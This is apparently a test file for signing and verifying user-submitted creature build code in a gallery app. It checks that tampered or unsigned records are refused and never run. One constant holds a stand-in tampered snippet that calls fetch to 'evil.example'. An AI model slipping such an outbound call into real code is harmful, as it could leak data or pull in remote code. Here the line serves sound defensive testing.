import { describe, expect, test } from "bun:test";
import { CREATURE_PIXEL_BYTES, type CreatureCodeSource, drawCreature, sha256Hex } from "./creature-build";
import { generateSigningKeys, signBuild, verifyBuild } from "./creature-signing";

const CODE = "function build(k) { humanoid(k, {}); }";
const TAMPERED_CODE = "function build(k) { fetch('https://evil.example/'); humanoid(k, {}); }";
const PIXELS = new Uint8Array(CREATURE_PIXEL_BYTES).map((_, index) => (index * 7) % 256);
const CREATURE_ID = "brine-hound-aaaa";

async function signedRecord() {
  const keys = await generateSigningKeys();
  const build = { codeSha256: await sha256Hex(CODE), pixelsSha256: await sha256Hex(PIXELS) };
  const signature = await signBuild(keys.privateKey, CREATURE_ID, build);
  return { keys, record: { id: CREATURE_ID, build: { ...build, signature } } };
}

describe("signing a creature", () => {
  test("a record signed with the key verifies against its public key", async () => {
    const { keys, record } = await signedRecord();
    expect(await verifyBuild(keys.publicKey, record.id, record.build, record.build.signature)).toBe(true);
  });

  test("a signature is refused for other code, other pixels, another creature, another key and no signature", async () => {
    const { keys, record } = await signedRecord();
    const { signature } = record.build;
    const otherCode = { ...record.build, codeSha256: await sha256Hex(TAMPERED_CODE) };
    expect(await verifyBuild(keys.publicKey, record.id, otherCode, signature)).toBe(false);
    const otherPixels = { ...record.build, pixelsSha256: await sha256Hex(new Uint8Array(CREATURE_PIXEL_BYTES)) };
    expect(await verifyBuild(keys.publicKey, record.id, otherPixels, signature)).toBe(false);
    expect(await verifyBuild(keys.publicKey, "another-one-bbbb", record.build, signature)).toBe(false);
    const stranger = await generateSigningKeys();
    expect(await verifyBuild(stranger.publicKey, record.id, record.build, signature)).toBe(false);
    expect(await verifyBuild(keys.publicKey, record.id, record.build, undefined)).toBe(false);
  });

  test("malformed signatures and keys are false, not a throw", async () => {
    const { keys, record } = await signedRecord();
    expect(await verifyBuild(keys.publicKey, record.id, record.build, "not base64 !!")).toBe(false);
    expect(await verifyBuild(keys.publicKey, record.id, record.build, btoa("short"))).toBe(false);
    expect(await verifyBuild("not a key", record.id, record.build, record.build.signature)).toBe(false);
  });
});

describe("a tampered gallery record is never run", () => {
  function source(publicKey: string, code: string) {
    const events: string[] = [];
    const fake: CreatureCodeSource = {
      fetchCode: async () => {
        events.push("fetched");
        return code;
      },
      draw: async () => {
        events.push("ran");
        return new Uint8Array(PIXELS);
      },
      authentic: async (creature) =>
        creature.build !== undefined &&
        (await verifyBuild(publicKey, creature.id, creature.build, creature.build.signature)),
    };
    return { fake, events };
  }

  test("the signed record draws", async () => {
    const { keys, record } = await signedRecord();
    const { fake, events } = source(keys.publicKey, CODE);
    expect(await drawCreature(record, fake)).toEqual(PIXELS);
    expect(events).toEqual(["fetched", "ran"]);
  });

  test("code swapped in the store fails the record's hash and does not run", async () => {
    const { keys, record } = await signedRecord();
    const { fake, events } = source(keys.publicKey, TAMPERED_CODE);
    expect(await drawCreature(record, fake)).toBeNull();
    expect(events).not.toContain("ran");
  });

  test("code and hash swapped together fail the signature: nothing is fetched, nothing runs", async () => {
    const { keys, record } = await signedRecord();
    const forged = { ...record, build: { ...record.build, codeSha256: await sha256Hex(TAMPERED_CODE) } };
    const { fake, events } = source(keys.publicKey, TAMPERED_CODE);
    expect(await drawCreature(forged, fake)).toBeNull();
    expect(events).toEqual([]);
  });

  test("an unsigned record is refused", async () => {
    const { keys, record } = await signedRecord();
    const unsigned = { codeSha256: record.build.codeSha256, pixelsSha256: record.build.pixelsSha256 };
    const { fake, events } = source(keys.publicKey, CODE);
    expect(await drawCreature({ ...record, build: unsigned }, fake)).toBeNull();
    expect(events).toEqual([]);
  });
});
